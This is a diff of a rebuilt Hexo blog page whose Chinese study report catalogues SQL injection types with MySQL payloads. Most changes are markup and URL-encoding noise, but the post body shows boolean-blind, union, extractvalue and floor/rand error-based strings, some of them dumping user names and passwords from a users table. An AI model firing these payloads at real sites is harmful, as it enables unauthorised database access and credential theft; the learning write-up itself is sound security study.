@@ -6,10 +6,10 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-Hans">
-<head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 <meta name="theme-color" content="#222">
 
 <script>
@@ -30,8 +30,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
 
 
 
@@ -50,7 +50,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
 
 
 
@@ -84,9 +84,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
@@ -104,7 +104,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -118,21 +118,21 @@
 <meta name="description" content="任务标题： 数据库基础之数据库相关注入语句的收集和学习1、收集网络上各种 sql 注入时使用的 payload 并理解其适用的环境（检测注入、利用注入） 2、记录 sqlmap 的检测和利用过程中使用的 payload（也算一种 payload 收集方式） 3、理解以上涉及的 sql 语句的意思，其中会涉及不同的数据库、不同注入场景，可以将学习的过程和收集的方式进行整理形成报告，关于 payloa">
 <meta property="og:type" content="article">
 <meta property="og:title" content="第六周：数据库相关注入语句的收集和学习">
-<meta property="og:url" content="http://yoursite.com/2019/11/23/第六周：数据库相关注入语句的收集和学习/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/11/23/%E7%AC%AC%E5%85%AD%E5%91%A8%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="Bu1&#39;Blog">
 <meta property="og:description" content="任务标题： 数据库基础之数据库相关注入语句的收集和学习1、收集网络上各种 sql 注入时使用的 payload 并理解其适用的环境（检测注入、利用注入） 2、记录 sqlmap 的检测和利用过程中使用的 payload（也算一种 payload 收集方式） 3、理解以上涉及的 sql 语句的意思，其中会涉及不同的数据库、不同注入场景，可以将学习的过程和收集的方式进行整理形成报告，关于 payloa">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-11-23T15:27:58.954Z">
+<meta property="og:locale">
+<meta property="article:published_time" content="2019-11-23T15:22:43.000Z">
+<meta property="article:modified_time" content="2019-11-23T15:27:58.954Z">
+<meta property="article:author" content="Bu1">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="第六周：数据库相关注入语句的收集和学习">
-<meta name="twitter:description" content="任务标题： 数据库基础之数据库相关注入语句的收集和学习1、收集网络上各种 sql 注入时使用的 payload 并理解其适用的环境（检测注入、利用注入） 2、记录 sqlmap 的检测和利用过程中使用的 payload（也算一种 payload 收集方式） 3、理解以上涉及的 sql 语句的意思，其中会涉及不同的数据库、不同注入场景，可以将学习的过程和收集的方式进行整理形成报告，关于 payloa">
 
 
 
 <script type="text/javascript" id="hexo.configurations">
   var NexT = window.NexT || {};
   var CONFIG = {
-    root: '/',
+    root: '',
     scheme: 'Muse',
     version: '5.1.4',
     sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
@@ -155,7 +155,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/11/23/第六周：数据库相关注入语句的收集和学习/">
+  <link rel="canonical" href="http://yoursite.com/2019/11/23/第六周：数据库相关注入语句的收集和学习/"/>
 
 
 
@@ -171,7 +171,7 @@
 
 
 
-</head>
+<meta name="generator" content="Hexo 5.4.0"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
@@ -189,7 +189,7 @@
     
 
     <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
+      <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">Bu1'Blog</span>
         <span class="logo-line-after"><i></i></span>
@@ -217,9 +217,9 @@
       
         
         <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
+          <a href="/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
             首页
           </a>
@@ -227,9 +227,9 @@
       
         
         <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
+          <a href="/archives/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
             归档
           </a>
@@ -237,9 +237,9 @@
       
         
         <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
+          <a href="/categories/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
             
             分类
           </a>
@@ -247,9 +247,9 @@
       
         
         <li class="menu-item menu-item-about">
-          <a href="/about/" rel="section">
+          <a href="/about/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
             
             关于
           </a>
@@ -288,11 +288,11 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/23/第六周：数据库相关注入语句的收集和学习/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/23/%E7%AC%AC%E5%85%AD%E5%91%A8%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Bu1">
-      <meta itemprop="description" content>
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
       <meta itemprop="image" content="/images/avatar.png">
     </span>
 
@@ -328,7 +328,7 @@
           </span>
 
           
-            <span class="post-category">
+            <span class="post-category" >
             
               <span class="post-meta-divider">|</span>
             
@@ -340,7 +340,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/信安之路/" itemprop="url" rel="index">
+                  <a href="/categories/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/" itemprop="url" rel="index">
                     <span itemprop="name">信安之路</span>
                   </a>
                 </span>
@@ -358,8 +358,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/11/23/第六周：数据库相关注入语句的收集和学习/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/11/23/第六周：数据库相关注入语句的收集和学习/" itemprop="commentCount"></span>
+                <a href="/2019/11/23/%E7%AC%AC%E5%85%AD%E5%91%A8%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/11/23/第六周：数据库相关注入语句的收集和学习/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -422,7 +423,7 @@
 <p>2、记录 sqlmap 的检测和利用过程中使用的 payload（也算一种 payload 收集方式）</p>
 <p>3、理解以上涉及的 sql 语句的意思，其中会涉及不同的数据库、不同注入场景，可以将学习的过程和收集的方式进行整理形成报告，关于 payload 的理解，其中会涉及之前学习的基础。</p>
 <p>扩展学习：理解 sqlmap 自带 tamper 的原理，这里通常包含很多数据库的特性，从而实现 payload 变形啥的，用来绕过一些简单的安全检测</p>
-<a id="more"></a>
+<span id="more"></span>
 
 <h2 id="相关问题"><a href="#相关问题" class="headerlink" title="相关问题"></a>相关问题</h2><p>1、本次学习还是围绕数据库进行，两个重点：</p>
 <p>一、通过网络进行信息收集，尽可能多的收集网络上公开的有关 sql 注入涉及到的注入 payload，来源可以是：文章中涉及的、github 上某些工具中提供的、某些成品工具中携带的（比如：sqlmap）</p>
@@ -440,28 +441,20 @@
 <p> id=1’ and length(database())&gt;1 #</p>
 <p>当我们输入的注入语句无法通过回显以及报错的方式来获取数据，这时候就可能存在盲注，通过判断有跟没有、对或错来判断regexp 是否匹配到数据了。</p>
 </li>
-</ol>
-<ol start="2">
 <li><p>基于错误的SQL注入（报错型注入）</p>
 <p>报错型注入是利用了MySQL的第8652号BUG，但是用echo mysql_error();输出了错误信息时使用，</p>
 <p>payload：</p>
 <p>id=’ and (extractvalue(1,concat(0x7e,(select user()),0x7e)))#</p>
 <p>当然如果报错的数据不能回显到页面上来，就无法使用报错注入，这时候我们就可以考虑是否存在盲注。</p>
 </li>
-</ol>
-<ol start="3">
 <li><p>UNION查询SQL注入（可联合查询注入）</p>
 <p>联合查询就是通过union关键字将多条语句合并在一起执行，让前一条语句报错从而让后一条语句的执行结果输出到前一条语句的显位中。需要注意的是查询语句要符合1.相同列数2.相似的数据类型3.相同的编码。</p>
 <p>payload：</p>
 <p>id=-1’ union select 1,(select user()),(select version())#</p>
 </li>
-</ol>
-<ol start="4">
 <li><p>堆叠查询SQL注入（可多语句查询注入）</p>
 <p>多语句查询注入也叫做堆叠查询，与联合查询有点相似，都可以多条语句查询，堆叠查询的关键是分号(;)比较直观的就是如果分号被过滤或者无法绕过就无法注入.</p>
 </li>
-</ol>
-<ol start="5">
 <li><p>基于时间的盲SQL注入（基于时间延迟注入）</p>
 <p>如果在测试的时候发现都不存在前面三种所说的注入，那就有可能是时间盲注，时间盲注的特点是无回显，无报错，也没有多种页面状态。</p>
 <p>这时候就需要通过增加sleep()函数来判断注入语句的执行，而布尔则是根据页面的对错来判断。</p>
@@ -513,11 +506,11 @@
 <li><p>报错型注入</p>
 <blockquote>
 <p>floor 类型<br>固定格式：(星号位置替换为查询语句即可)</p>
-<p>?id=1’ and (select 1 from (select count(<em>),concat(0x3a,0x3a,(<strong>**</strong></em>),0x3a,0x3a, floor(rand(0)*2)) a from information_schema.columns group by a)s) –+</p>
-<p>1.爆数据库：<br>?id=1’ and (select 1 from (select count(<em>),concat(0x3a,0x3a,(select distinct table_schema from information_schema.columns limit 1,1),0x3a,0x3a, floor(rand(0)*2)) a from information_schema.columns group by a)s) –+<br>*小提示：由于报错信息每次只能显示1行，所以此处使用limit，通过修改limit后的第一个数值，可依次爆出所有内容。下同。</em></p>
+<p>?id=1’ and (select 1 from (select count(<em>),concat(0x3a,0x3a,(</em>******),0x3a,0x3a, floor(rand(0)*2)) a from information_schema.columns group by a)s) –+</p>
+<p>1.爆数据库：<br>?id=1’ and (select 1 from (select count(*),concat(0x3a,0x3a,(select distinct table_schema from information_schema.columns limit 1,1),0x3a,0x3a, floor(rand(0)*2)) a from information_schema.columns group by a)s) –+<br><em>小提示：由于报错信息每次只能显示1行，所以此处使用limit，通过修改limit后的第一个数值，可依次爆出所有内容。下同。</em></p>
 <p>2.爆表名（此例为message数据库）：?id=1’ and (select 1 from (select count(),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=’message’ limit 2,1),0x3a,0x3a, floor(rand(0)<em>2)) a from information_schema.columns group by a)s) –+</em></p>
-<p>3.爆字段（此例为message数据库的users表）：<br>?id=1’ and (select 1 from (select count(<em>),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_schema=’message’ and table_name=’users’ limit 2,1),0x3a,0x3a, floor(rand(0)</em>2)) a from information_schema.columns group by a)s) –+</p>
-<p>4.爆内容（此例为message数据库的users表）：<br>?id=1’ and (select 1 from (select count(<em>),concat(0x3a,0x3a,(select concat(0x3a,0x3a, name,0x3a,0x3a,passwd,0x3a,0x3a) from message.users limit 0,1),0x3a,0x3a, floor(rand(0)</em>2)) a from information_schema.columns group by a)s) –+</p>
+<p>3.爆字段（此例为message数据库的users表）：<br>?id=1’ and (select 1 from (select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_schema=’message’ and table_name=’users’ limit 2,1),0x3a,0x3a, floor(rand(0)*2)) a from information_schema.columns group by a)s) –+</p>
+<p>4.爆内容（此例为message数据库的users表）：<br>?id=1’ and (select 1 from (select count(*),concat(0x3a,0x3a,(select concat(0x3a,0x3a, name,0x3a,0x3a,passwd,0x3a,0x3a) from message.users limit 0,1),0x3a,0x3a, floor(rand(0)*2)) a from information_schema.columns group by a)s) –+</p>
 </blockquote>
 </li>
 <li><p>布尔型盲注</p>
@@ -531,9 +524,9 @@
 </li>
 </ul>
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
-<li><a href="http://www.myh0st.cn/index.php/archives/495/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/495/</a></li>
-<li><a href="https://www.addon.pub/2018/02/02/sqlmap-payload学习/" target="_blank" rel="noopener">https://www.addon.pub/2018/02/02/sqlmap-payload学习/</a></li>
-<li><a href="https://www.jianshu.com/p/ce54e99ee789" target="_blank" rel="noopener">https://www.jianshu.com/p/ce54e99ee789</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.myh0st.cn/index.php/archives/495/">http://www.myh0st.cn/index.php/archives/495/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.addon.pub/2018/02/02/sqlmap-payload%E5%AD%A6%E4%B9%A0/">https://www.addon.pub/2018/02/02/sqlmap-payload学习/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ce54e99ee789">https://www.jianshu.com/p/ce54e99ee789</a></li>
 </ul>
 
       
@@ -555,7 +548,7 @@
   </li>
 <li class="post-copyright-link">
   <strong>本文链接：</strong>
-  <a href="http://bu1.github.io/2019/11/23/第六周：数据库相关注入语句的收集和学习/" title="第六周：数据库相关注入语句的收集和学习">http://bu1.github.io/2019/11/23/第六周：数据库相关注入语句的收集和学习/</a>
+  <a target="_blank" rel="noopener" href="http://bu1.github.io/2019/11/23/第六周：数据库相关注入语句的收集和学习/" title="第六周：数据库相关注入语句的收集和学习">http://bu1.github.io/2019/11/23/第六周：数据库相关注入语句的收集和学习/</a>
 </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -585,7 +578,7 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/11/21/第四周：数据库系统功能相关学习/" rel="next" title="第四周：数据库系统功能相关学习">
+              <a href="/2019/11/21/%E7%AC%AC%E5%9B%9B%E5%91%A8%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/" rel="next" title="第四周：数据库系统功能相关学习">
                 <i class="fa fa-chevron-left"></i> 第四周：数据库系统功能相关学习
               </a>
             
@@ -637,7 +630,7 @@
       <div id="disqus_thread">
         <noscript>
           Please enable JavaScript to view the
-          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+          <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
         </noscript>
       </div>
     </div>
@@ -679,10 +672,12 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="Bu1">
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="" />
             
-              <p class="site-author-name" itemprop="name">Bu1</p>
-              <p class="site-description motion-element" itemprop="description">最为惊艳的是思想碰撞产生的火花。</p>
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
           </div>
 
           <nav class="site-state motion-element">
@@ -690,7 +685,7 @@
             
               <div class="site-state-item site-state-posts">
               
-                <a href="/archives/">
+                <a href="/archives/%20%7C%7C%20archive">
               
                   <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">日志</span>
@@ -756,7 +751,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#任务标题：-数据库基础之数据库相关注入语句的收集和学习"><span class="nav-number">1.</span> <span class="nav-text">任务标题： 数据库基础之数据库相关注入语句的收集和学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#相关问题"><span class="nav-number">1.1.</span> <span class="nav-text">相关问题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#学习报告"><span class="nav-number">2.</span> <span class="nav-text">学习报告</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入"><span class="nav-number">2.1.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常见的SQL注入类型及相关payload"><span class="nav-number">2.2.</span> <span class="nav-text">常见的SQL注入类型及相关payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常见的绕过认证的方式"><span class="nav-number">2.3.</span> <span class="nav-text">常见的绕过认证的方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用的payload"><span class="nav-number">2.4.</span> <span class="nav-text">常用的payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">2.5.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%BB%E5%8A%A1%E6%A0%87%E9%A2%98%EF%BC%9A-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">任务标题： 数据库基础之数据库相关注入语句的收集和学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="nav-number">1.1.</span> <span class="nav-text">相关问题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A"><span class="nav-number">2.</span> <span class="nav-text">学习报告</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%8F%8A%E7%9B%B8%E5%85%B3payload"><span class="nav-number">2.2.</span> <span class="nav-text">常见的SQL注入类型及相关payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-number">2.3.</span> <span class="nav-text">常见的绕过认证的方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84payload"><span class="nav-number">2.4.</span> <span class="nav-text">常用的payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">2.5.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -790,7 +785,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">67.5k</span>
+    <span title="Site words total count">68k</span>
   
 </div>
 
@@ -928,7 +923,7 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://yoursite.com/2019/11/23/第六周：数据库相关注入语句的收集和学习/';
+          this.page.url = 'http://yoursite.com/2019/11/23/%E7%AC%AC%E5%85%AD%E5%91%A8%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/';
           this.page.identifier = '2019/11/23/第六周：数据库相关注入语句的收集和学习/';
           this.page.title = '第六周：数据库相关注入语句的收集和学习';
         };
